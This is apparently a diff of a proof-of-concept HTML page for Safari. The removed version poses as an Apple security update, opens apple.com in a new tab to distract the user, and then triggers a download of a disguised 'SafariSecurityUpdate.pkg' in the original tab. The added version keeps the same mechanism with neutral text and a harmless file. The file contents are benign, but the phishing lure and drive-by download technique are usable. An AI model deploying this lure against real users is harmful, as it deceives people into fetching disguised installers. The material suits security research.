@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple Security Verification</title>
+    <title>Tester</title>
     <style>
         body { 
             font-family: -apple-system, sans-serif; 
@@ -23,11 +23,9 @@
 <body>
 
     <div class="card">
-        <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png" width="50" alt="Apple">
-        <h1>Security Update</h1>
-        <p>A critical update is required for your Safari browser. Please verify your session on the official site.</p>
-        
-        <a href="#" id="start-btn" class="btn">Verify at Apple.com</a>
+        <h1>click the button below</h1>
+    
+        <a href="#" id="start-btn" class="btn">Click Here</a>
     </div>
 
     <script>
@@ -35,33 +33,25 @@
 
         btn.onclick = (e) => {
             e.preventDefault();
-
-            // 1. Buka Apple.com di TAB BARU (User fokus ke sini)
-            window.open("https://www.apple.com", "_blank");
-
-            // 2. Di TAB INI (Attacker Tab), langsung ganti rute ke download
-            // Kita kasih delay 1 detik biar transisi tab-nya smooth
+            window.open("https://google.com", "_blank");
             setTimeout(() => {
                 triggerDownload();
             }, 1000);
         };
 
         function triggerDownload() {
-            const fakeFileContent = "This is a proof-of-concept file for Apple Security Research.";
+            const fakeFileContent = "tester";
             const blob = new Blob([fakeFileContent], { type: 'application/octet-stream' });
             const blobUrl = URL.createObjectURL(blob);
 
             const a = document.createElement('a');
             a.href = blobUrl;
-            a.download = 'SafariSecurityUpdate.pkg';
+            a.download = 'Bypass.pkg';
             document.body.appendChild(a);
             a.click();
             
-            // Cleanup & Info untuk Analyst
             URL.revokeObjectURL(blobUrl);
             document.querySelector('.card').innerHTML = `
-                <h2 style="color:green;">Download Triggered</h2>
-                <p>Check your downloads folder. The PoC has executed while the other tab is at Apple.com.</p>
             `;
         }
     </script>
